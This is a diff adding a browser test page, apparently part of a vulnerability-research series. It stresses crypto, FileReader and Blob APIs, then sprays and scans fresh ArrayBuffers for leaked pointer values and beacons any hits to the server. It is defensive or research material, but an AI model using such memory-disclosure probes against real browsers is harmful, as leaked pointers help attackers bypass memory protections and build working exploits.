@@ -1,0 +1,310 @@
+<!--
+  p781: Crypto API / SubtleCrypto / FileReader / Blob reading residue
+
+  crypto.getRandomValues() fills a TypedArray from a C++ CSPRNG. The
+  RNG state is process-global but each call may allocate intermediate
+  buffers for entropy mixing depending on the implementation.
+
+  SubtleCrypto (crypto.subtle) performs cryptographic operations with
+  C++ backing: key generation allocates CryptoKey objects with internal
+  key material, digest/encrypt/decrypt allocate intermediate buffers
+  for the operation, and importKey/exportKey serialize key material
+  through structured clone-like paths.
+
+  FileReader reads Blob content through a C++ FileReaderLoader that
+  allocates an accumulation buffer. readAsText uses TextCodec for
+  decoding, readAsDataURL base64-encodes through a C++ encoder,
+  and readAsArrayBuffer returns raw bytes. Each completed read
+  produces a result buffer that is freed when the FileReader is
+  reused or GC'd.
+
+  Blob.text() / Blob.arrayBuffer() / Blob.stream() are newer APIs
+  that also read Blob content through C++ loaders.
+
+  Attack angles:
+  A) SubtleCrypto key generation churn (AES/RSA/ECDSA/HMAC).
+  B) SubtleCrypto digest with varied data sizes then spray.
+  C) FileReader readAsText/readAsDataURL/readAsArrayBuffer churn.
+  D) Blob.text() / Blob.arrayBuffer() completion residue.
+  E) crypto.getRandomValues with varied buffer sizes.
+  F) CryptoKey export/import serialization residue.
+
+  CRASH_CLASS: LOW (crypto/file-reading APIs, no side effects)
+  prior art: p779 (Blob URL/slice), p772 (Fetch streams)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p781</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p781-START');
+
+// === Section A: SubtleCrypto key generation churn ===
+try{
+  b('A-keygen');
+  var aHits=0;
+  var subtle=crypto&&crypto.subtle;
+
+  if(!subtle){
+    b('A-SKIP no crypto.subtle');
+  }else{
+    var keyAlgos=[
+      {name:'AES-GCM',length:256},
+      {name:'AES-CBC',length:128},
+      {name:'HMAC',hash:'SHA-256',length:256}
+    ];
+
+    for(var round=0;round<3;round++){
+      var keyPromises=[];
+      for(var ai=0;ai<keyAlgos.length;ai++){
+        for(var i=0;i<20;i++){
+          try{
+            var p=subtle.generateKey(keyAlgos[ai],true,['encrypt','decrypt']);
+            keyPromises.push(p);
+          }catch(e){
+            if(i===0&&round===0)b('A keygen_err='+keyAlgos[ai].name+' '+e.message);
+          }
+        }
+      }
+
+      if(round===0)b('A queued '+keyPromises.length+' key generations');
+
+      try{Promise.all(keyPromises);}catch(e){}
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      aHits+=sprayAndScan('A',round,[48,64,96,128]);
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: SubtleCrypto digest churn ===
+try{
+  b('B-digest');
+  var bHits=0;
+  var subtle=crypto&&crypto.subtle;
+
+  if(!subtle){
+    b('B-SKIP');
+  }else{
+    var algos=['SHA-1','SHA-256','SHA-384','SHA-512'];
+
+    for(var round=0;round<3;round++){
+      var digestPromises=[];
+      for(var ai=0;ai<algos.length;ai++){
+        for(var i=0;i<30;i++){
+          var dataSize=32+i*16;
+          var data=new Uint8Array(dataSize);
+          for(var j=0;j<dataSize;j++)data[j]=(round*30+i+j)&0xFF;
+          try{
+            var p=subtle.digest(algos[ai],data.buffer);
+            digestPromises.push(p);
+          }catch(e){
+            if(i===0&&round===0)b('B digest_err='+algos[ai]+' '+e.message);
+          }
+        }
+      }
+
+      if(round===0)b('B queued '+digestPromises.length+' digests across '+algos.length+' algos');
+
+      try{Promise.all(digestPromises);}catch(e){}
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      bHits+=sprayAndScan('B',round,[32,48,64,96]);
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: FileReader read churn ===
+try{
+  b('C-filereader');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var readers=[];
+      for(var i=0;i<30;i++){
+        var content='file_content_'+round+'_'+i+'_'+'d'.repeat(50+i*5);
+        var blob=new Blob([content],{type:'text/plain'});
+
+        var fr1=new FileReader();
+        fr1.readAsText(blob);
+        readers.push(fr1);
+
+        var fr2=new FileReader();
+        fr2.readAsDataURL(blob);
+        readers.push(fr2);
+
+        var fr3=new FileReader();
+        fr3.readAsArrayBuffer(blob);
+        readers.push(fr3);
+      }
+
+      if(round===0){
+        b('C created '+readers.length+' FileReader reads (text+dataurl+arraybuffer)');
+        if(readers[0].readyState!==undefined)b('C readyState='+readers[0].readyState);
+      }
+
+      readers=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[48,64,96,128]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Blob.text() / Blob.arrayBuffer() ===
+try{
+  b('D-blob-read');
+  var dHits=0;
+
+  var blobTextSupported=false;
+  try{
+    var testBlob=new Blob(['test']);
+    if(typeof testBlob.text==='function')blobTextSupported=true;
+  }catch(e){}
+
+  if(!blobTextSupported){
+    b('D-SKIP no Blob.text()');
+  }else{
+    for(var round=0;round<5;round++){
+      var promises=[];
+      for(var i=0;i<50;i++){
+        var content='blob_read_'+round+'_'+i+'_'+'r'.repeat(40+i);
+        var blob=new Blob([content],{type:'application/octet-stream'});
+
+        try{promises.push(blob.text());}catch(e){}
+        try{promises.push(blob.arrayBuffer());}catch(e){}
+      }
+
+      if(round===0)b('D queued '+promises.length+' blob reads');
+
+      try{Promise.all(promises);}catch(e){}
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[48,64,96,128]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: crypto.getRandomValues varied sizes ===
+try{
+  b('E-random');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var buffers=[];
+      var sizes=[16,32,64,128,256,512,1024];
+      for(var si=0;si<sizes.length;si++){
+        for(var i=0;i<20;i++){
+          var buf=new Uint8Array(sizes[si]);
+          crypto.getRandomValues(buf);
+          buffers.push(buf);
+        }
+      }
+
+      if(round===0){
+        b('E generated '+buffers.length+' random buffers across '+sizes.length+' sizes');
+        var sample=buffers[0];
+        var hex='';
+        for(var i=0;i<Math.min(16,sample.length);i++){
+          var h=sample[i].toString(16);
+          if(h.length<2)h='0'+h;
+          hex+=h;
+        }
+        b('E sample_16B='+hex);
+      }
+
+      buffers=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: CryptoKey export/import serialization ===
+try{
+  b('F-key-export');
+  var fHits=0;
+  var subtle=crypto&&crypto.subtle;
+
+  if(!subtle){
+    b('F-SKIP');
+  }else{
+    for(var round=0;round<3;round++){
+      var promises=[];
+      for(var i=0;i<20;i++){
+        try{
+          var p=subtle.generateKey({name:'AES-GCM',length:256},true,['encrypt','decrypt'])
+            .then(function(key){
+              return subtle.exportKey('raw',key).then(function(raw){
+                return subtle.importKey('raw',raw,{name:'AES-GCM'},true,['encrypt','decrypt']);
+              });
+            });
+          promises.push(p);
+        }catch(e){
+          if(i===0&&round===0)b('F export_err='+e.message);
+        }
+      }
+
+      for(var i=0;i<10;i++){
+        try{
+          var p2=subtle.generateKey({name:'HMAC',hash:'SHA-256'},true,['sign','verify'])
+            .then(function(key){
+              return subtle.exportKey('raw',key).then(function(raw){
+                return subtle.importKey('raw',raw,{name:'HMAC',hash:'SHA-256'},true,['sign','verify']);
+              });
+            });
+          promises.push(p2);
+        }catch(e){}
+      }
+
+      if(round===0)b('F queued '+promises.length+' key export/import cycles');
+
+      try{Promise.all(promises);}catch(e){}
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      fHits+=sprayAndScan('F',round,[48,64,96,128]);
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p781-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
